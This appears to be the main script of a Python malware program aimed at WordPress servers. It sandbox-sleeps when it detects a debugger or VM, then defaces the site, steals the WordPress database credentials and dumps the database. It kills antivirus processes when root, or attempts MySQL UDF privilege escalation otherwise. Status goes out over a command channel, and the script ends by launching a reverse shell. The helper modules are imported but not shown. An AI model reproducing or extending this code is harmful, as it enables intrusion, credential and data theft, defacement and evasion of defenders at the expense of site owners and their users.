#!/usr/bin/python3
from concurrent.futures import ThreadPoolExecutor
from socket import gethostbyname, gethostname
import logging, sys, os
from queue import Queue
from time import sleep
import time



from modules.malware.check_process import check_parent, kill_avs, self_kill, wait_parent
from modules.cookie_comm import communication_client_main, read_file
from modules.malware.execute import reverse_shell_main, is_root
from modules.malware.mysql import dump_wp_db, priv_esc_udf
from modules.malware.wordpress import get_wp_db_creds
from modules.malware.defacement import defacement
from modules.crypto import encrypt, decrypt
from modules.hash import hash

from modules.malware.evasion import is_vm, is_debugger

if __name__ == '__main__':
    exfiltrate = Queue()
    instructions = Queue()
    client_id = f"{gethostname()}-{gethostbyname(gethostname())}"

    if is_debugger() or is_vm():    # Check if there is a debugger or a vm
        sleep(60*12) # Sleep 12 min

    #  [%(thread)-6d] [%(threadName)-25s]
    FORMAT = '[%(asctime)s] [%(funcName)-30s] [%(levelname)-8s] [%(message)s]'
    #logging.basicConfig(filename='malware.log', encoding='utf-8', format=FORMAT, level=0)
    # logging.basicConfig(stream=sys.stdout, encoding='utf-8', format=FORMAT, level=30)

    id = str(int(time.time()))
    sleep(15)
    with ThreadPoolExecutor(max_workers=2) as executor:
        logging.info("START MALWARE MAIN")
        print("START MALWARE MAIN")
        exfiltrate.put("ID: "+id+" START MALWARE MAIN PID: "+str(os.getpid()))
        executor.submit(communication_client_main, client_id, exfiltrate, instructions, encrypt, decrypt)

        status = check_parent()
        if not status:
            exfiltrate.put(id+' Parent')
            print("Parent")
            defacement(exfiltrate)
            sleep(60)
            db_creds = get_wp_db_creds(exfiltrate)
            if db_creds:
                print("Creds Vorhanden")
                dump_wp_db(db_creds, exfiltrate)
            if is_root():
                exfiltrate.put(id+" Is Root")
                print("Is Root")
                kill_avs()
            else:
                exfiltrate.put(id+" Is not Root")
                print("Is not Root")
                if db_creds:
                    print("Do Priv Esc")
                    sleep(60)
                    priv_esc_udf(db_creds, exfiltrate)
                else:
                    print("No Creds")
            exfiltrate.put(' END')
        else:
            print("Child")
            exfiltrate.put(id+' Child - killing parent')
            wait_parent()
            exfiltrate.put('END') # flag to open shell 
        sleep(5)     
        executor.submit(reverse_shell_main, instructions, exfiltrate, 5)